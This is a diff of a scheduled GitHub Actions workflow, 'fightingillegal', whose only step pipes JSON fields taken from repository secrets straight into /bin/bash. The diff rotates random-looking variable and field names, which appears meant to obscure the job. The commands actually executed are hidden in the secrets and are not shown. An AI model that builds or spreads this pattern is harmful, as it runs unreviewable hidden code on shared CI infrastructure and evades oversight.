@@ -1,25 +1,23 @@
 name: fightingillegal
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '1 4/6 * * *'
+    - cron: '11 4/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: fightingillegal
         env:
-          srosu2275: ${{ secrets.srosu2275 }}
+          do98072: ${{ secrets.do98072 }}
         run: |
-          echo $srosu2275 | jq -r .ytyl2234 | /bin/bash
-          echo $htnuw61354 | jq -r .l946 | /bin/bash
-          echo $nmwo97 | jq -r .u429 | /bin/bash
-          echo $oz6308 | jq -r .djyca4777 | /bin/bash
-          echo $zeqte5 | jq -r .cvdxo55 | /bin/bash
-          echo $vymw89 | jq -r .bpr6432 | /bin/bash
-          echo $veqt0100 | jq -r .ugqfl4171 | /bin/bash
-          echo $s7177 | jq -r .gqutt54386 | /bin/bash
+          echo $do98072 | jq -r .hvy56592 | /bin/bash
+          echo $yhr4 | jq -r .vfau9 | /bin/bash
+          echo $t32470 | jq -r .cz388 | /bin/bash
+          echo $hgap13064 | jq -r .quqfk0 | /bin/bash
+          echo $pthr8 | jq -r .ebg4 | /bin/bash
+          echo $jo0 | jq -r .uz66 | /bin/bash
+          echo $nly07 | jq -r .riiw3 | /bin/bash
+          echo $kwfw696 | jq -r .x26386 | /bin/bash
 
